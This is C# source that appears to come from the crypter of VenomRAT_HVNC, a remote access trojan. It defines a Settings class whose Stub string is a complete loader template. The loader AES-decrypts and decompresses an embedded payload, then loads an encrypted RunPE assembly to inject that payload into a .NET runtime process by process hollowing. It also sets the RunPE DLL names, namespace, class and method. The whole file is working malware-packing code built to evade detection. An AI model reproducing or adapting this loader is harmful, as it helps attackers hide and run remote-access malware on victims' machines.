namespace VenomRAT_HVNC.Crypter.Settings;

public class Settings
{
    public static string Stub { get; set; } = "using System;\nusing System.IO;\nusing System.IO.Compression;\nusing System.Reflection;\nusing System.Runtime.InteropServices;\nusing System.Security.Cryptography;\nusing System.Text;\n\nnamespace Stub\n{\n    static class Program\n    {\n        [STAThread]\n        static void Main()\n        {\n            string passwordAesCompressStub = \"#PASSWORD_AES_COMPRESS_STUB#\";\n            string payloadAesCompressStub = \"#PAYLOAD_AES_COMPRESS_STUB#\";\n\n            RunPe(Decompress(AES_Decrypt(Convert.FromBase64String(payloadAesCompressStub), passwordAesCompressStub)));\n        }\n\n        private static void RunPe(byte[] data)\n        {\n            string codeRunPe = \"#CodeRunPE#\";\n            string passwordRunPe = \"#PasswordRunPE#\";\n            string pathProcess = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), \"#PathProcess#\");\n\n            Assembly runpeLoader = Assembly.Load(Decompress(AES_Decrypt(Convert.FromBase64String(codeRunPe), passwordRunPe)));\n\n            MethodInfo mi = runpeLoader.GetType(\"#NamespaceRunpe#.#ClassRunpe#\").GetMethod(\"#MethodsRunPE#\");\n            object[] parameters = { pathProcess, data };\n            mi.Invoke(null, parameters);\n        }\n\n        private static byte[] AES_Decrypt(byte[] payload, string key)\n        {\n            using (AesManaged aes256 = new AesManaged())\n            using (MD5CryptoServiceProvider hashAes = new MD5CryptoServiceProvider())\n            {\n                aes256.Key = hashAes.ComputeHash(Encoding.ASCII.GetBytes(key));\n                aes256.Mode = CipherMode.ECB;\n                return aes256.CreateDecryptor().TransformFinalBlock(payload, 0, payload.Length);\n            }\n        }\n\n        private static byte[] Decompress(byte[] decompressData)\n        {\n            using (MemoryStream decompressMemoryStream = new MemoryStream())\n            {\n                int decompressLength = BitConverter.ToInt32(decompressData, 0);\n                decompressMemoryStream.Write(decompressData, 4, decompressData.Length - 4);\n                byte[] decompressBuffer = new byte[decompressLength];\n                decompressMemoryStream.Position = 0;\n                using (GZipStream decompressZip = new GZipStream(decompressMemoryStream, CompressionMode.Decompress))\n                {\n                    decompressZip.Read(decompressBuffer, 0, decompressBuffer.Length);\n                }\n                return decompressBuffer;\n            }\n        }\n    }\n}\n";
    public static string FileNameRunPeDllMain { get; } = "RunPE.dll";
    public static string FileNameRunPeDllTemps { get; } = "Temps.dll";
    public static string NamespaceRunPe { get; set; } = "RunPE";
    public static string ClassRunPe { get; set; } = "Class1";
    public static string MethodRunPe { get; set; } = "Execute";
}